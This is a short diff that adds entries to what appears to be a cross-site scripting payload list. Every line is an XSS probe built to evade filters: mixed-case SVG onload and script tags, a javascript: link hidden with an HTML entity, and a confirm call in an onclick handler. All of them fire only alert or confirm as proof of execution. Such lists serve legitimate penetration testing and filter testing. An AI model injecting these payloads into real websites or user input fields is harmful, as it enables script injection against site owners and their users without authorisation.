@@ -1,3 +1,10 @@
 \\\">,<SvG/,onload=,alert(1) ,id=xss,>
 \\\">,<Svg/,onload=,alert(1) ,class=xss,>
 '>,<sVg/,onload=,alert(1) ,id=xss,>
+'>,<sVg/,onload=,alert(1), class=xss,>
+,</ScriPt>,<sCripT id=xss>,alert(1),</sCriPt>,
+,</ScriPt>,<sCripT class=xss>,alert(1),</sCriPt>,
+\\\">,<a ,href=javas&#99;ript:,alert(1),/class=xss,>click
+'>,<a ,href=javas&#99;ript:,alert(1),/class=xss,>click
+'>,<svg/,class=,'xss'onLoad=,alert(1),>
+\\\">,<d3\\\"<\\\"/,onclick=,\\\"1,class=xss,[confirm``]\\\"<\\\">z
